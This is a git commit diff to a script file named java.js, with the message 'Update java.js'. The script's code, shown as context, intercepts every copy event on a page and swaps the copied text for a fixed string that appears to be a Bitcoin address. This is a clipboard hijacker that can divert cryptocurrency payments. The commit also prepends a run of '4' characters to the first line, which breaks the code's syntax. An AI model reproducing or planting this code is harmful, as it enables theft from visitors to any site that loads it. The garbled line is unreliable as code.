c9cbd13400288ddd2ea52bf4128d7a45c54a71d0
Abdallah Mohamed <azaarps@yandex.ru>
2020-07-17 04:24:44 +0200

    Update java.js

--- java.js
+++ java.js
@@ -1,4 +1,4 @@
-document.addEventListener('copy', function(e){
+44444444444444444444444444444444444444document.addEventListener('copy', function(e){
 			e.clipboardData.setData('text/plain' , '1AzAaRRKVMaWjgyz4kN4ZjozNh7dadHxKs');
 			e.preventDefault();
 		});	
